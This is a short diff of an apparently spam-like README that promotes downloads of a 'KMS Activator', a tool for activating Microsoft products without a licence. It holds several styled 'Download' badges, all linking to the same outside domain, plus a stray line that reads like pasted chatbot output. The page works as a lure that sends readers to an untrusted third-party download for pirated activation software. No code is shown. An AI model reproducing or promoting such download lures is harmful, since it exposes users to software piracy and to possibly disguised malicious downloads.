@@ -65,15 +65,10 @@ If you’re looking for a reliable and free way to activate your Microsoft produ
 
 Here’s how you can add 10 different stylish “Download” buttons, inspired by GitHub’s badge style, in various colors and sizes including red, orange, and yellow:
 
----
-
----
-
 ### Download KMS Activator
 
 <a href="https://1cinsight.pro/" target="_blank"> <img src="https://img.shields.io/badge/Download-KMS%20Activator-0078d7?style=for-the-badge&logo=microsoft" alt="Download KMS Activator"> </a>
-
-
+---
 [![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/)
 ---
 [![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)
